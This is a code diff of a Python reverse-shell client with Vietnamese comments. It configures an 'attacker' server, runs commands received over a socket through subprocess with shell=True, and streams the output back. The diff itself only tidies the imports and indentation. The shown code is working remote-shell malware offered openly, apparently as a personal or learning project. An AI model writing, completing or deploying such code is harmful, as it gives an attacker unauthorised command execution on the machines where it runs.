@@ -1,5 +1,7 @@
 import socket
 import subprocess
+from subprocess import PIPE as proc_pipe
+from subprocess import STDOUT as proc_stdout
 
 
 # Cấu hình máy Attacker (Server)
@@ -25,15 +27,15 @@ def reverse_shell():
             # Khởi tạo tiến trình con
             # Sử dụng để thực hiện lệnh như lệnh Shell mà không bị lỗi
             # Redirect stderr ra stdout
-            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+            proc = subprocess.Popen(command, shell=True, stdout=proc_pipe, stderr=proc_stdout)
             # Dùng vòng lặp để đọc stdout từ phía tiến trình con
             # Nếu stdout là empty -> ngừng tiến trình con và break loop
             while True:
-              line = proc.stdout.readline()
-              if not line:
-                proc.terminate()
-                break
-              s.sendall(line)
+                line = proc.stdout.readline()
+                if not line:
+                    proc.terminate()
+                    break
+                s.sendall(line)
         except Exception as e:
             s.send(f"[-] Error: {str(e)}".encode('utf-8'))
 
